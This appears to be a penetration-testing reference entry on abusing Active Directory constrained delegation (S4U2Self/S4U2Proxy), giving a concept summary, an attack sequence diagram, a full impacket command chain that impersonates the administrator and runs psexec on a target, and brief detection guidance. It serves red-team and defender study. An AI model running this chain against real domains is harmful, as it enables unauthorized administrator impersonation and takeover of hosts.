---
id: constrained_deleg
type: technique
label: "Constrained delegation abuse (S4U2Self/S4U2Proxy)"
phase: "privesc"
tools: ["rubeus", "impacket"]
cve: null
detect: "4769 showing S4U flags set."
mitre: "T1558"
tag: null
---


# Constrained delegation abuse (S4U2Self/S4U2Proxy)

### Affected object / attribute
**`msDS-AllowedToDelegateTo`** on a service account, plus **`TRUSTED_TO_AUTH_FOR_DELEGATION`**.

### Concept (deep)
The service is restricted to specific SPNs. With **protocol transition**, the service can obtain a ticket **to itself on behalf of any user** (**S4U2Self**), then **S4U2Proxy** to obtain a ticket to the delegated SPN as that user. Compromising the service account → impersonate DA to the allowed service.

### Attack flow (Mermaid)
```mermaid
sequenceDiagram
    participant A as attacker (svc creds)
    participant KDC
    A->>KDC: S4U2Self (Administrator → self)
    KDC-->>A: Ticket to svc for Admin
    A->>KDC: S4U2Proxy (svc → allowed SPN)
    KDC-->>A: Ticket to target as Admin
    A->>A: psexec / DCSync
```

### Exhaustive commands
```bash
# ── Enumerate delegation ─────────────────────────────────────────────
impacket-findDelegation 'corp.local/kcduser':'Password123!' -dc-ip 10.0.1.200

# ── Add an SPN if the account lacks one ─────────────────────────────
python3 addspn.py -u 'corp.local\kcduser' -p 'Password123!' \
  -s host/KCD.corp.local --target-type samname -t kcduser

# ── S4U2Self + S4U2Proxy ─────────────────────────────────────────────
impacket-getST -spn 'cifs/target.corp.local' -impersonate administrator \
  'corp.local/kcduser:Password123!'

# ── Use the ticket ──────────────────────────────────────────────────
export KRB5CCNAME=administrator@cifs_target.corp.local@CORP.LOCAL.ccache
impacket-psexec -k -no-pass corp.local/administrator@target.corp.local
```

### Detection
**4769 S4U2Proxy** without a matching **4768** for the impersonated user; baseline `TrustedToAuthForDelegation`.

---
